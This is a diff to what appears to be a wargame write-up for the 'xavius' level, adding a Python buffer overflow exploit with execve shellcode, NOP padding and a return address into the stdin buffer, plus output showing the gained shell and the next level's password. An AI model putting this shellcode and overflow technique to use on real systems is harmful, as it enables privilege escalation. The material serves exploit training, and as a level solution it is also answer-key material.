@@ -153,3 +153,35 @@ shell(24byte) = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50
 
 -----
 
+##### python
+
+```python
+import os
+import struct
+
+append = lambda x: payload + x
+p32 = lambda x: struct.pack("<I", x)
+
+shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"
+stdin_buf_addr = 0x40015000
+
+payload = shellcode
+payload = append("\x90"*(44-len(shellcode)))
+payload = append(p32(stdin_buf_addr))
+
+print payload
+```
+
+```
+[nightmare@localhost nightmare]$ (python ex.py ; cat)|./xavius
+1픐h//shh/bin됥PS됣솻
+                     ?릱릱릱릱릱릱릱릱릱릱
+id
+uid=518(nightmare) gid=518(nightmare) euid=519(xavius) egid=519(xavius) groups=518(nightmare)
+my-pass
+euid = 519
+throw me away
+```
+
+-----
+
